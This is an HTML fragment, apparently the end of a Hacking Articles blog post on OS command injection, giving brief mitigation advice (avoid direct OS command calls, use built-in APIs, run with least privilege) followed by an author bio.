<p class="ai-optimize-158"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EK-a1x-oSws/XwYUuhaQoUI/AAAAAAAAljM/VvhBRo9Mj9wKEj54wW4ZikV57gNY8QrSACLcBGAsYHQ/s1600/27.png"/></span></p>
<p class="ai-optimize-159"><span style="color: #000000;">Avoid the applications from calling out directly the OS system commands. If needed the developers can use the build-in API for interacting with the Operating System.</span></p>
<p class="ai-optimize-160"><span style="color: #000000;">The developers should even ensure that the application must be running under the least privileges.</span></p>
<p class="ai-optimize-161"><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p class="ai-optimize-162"><span style="color: #000000;"><strong>Author</strong>: Chiragh Arora is a passionate Researcher and Technical Writer at Hacking Articles. He is a hacking enthusiast. Contact <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/chiragh-arora/">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
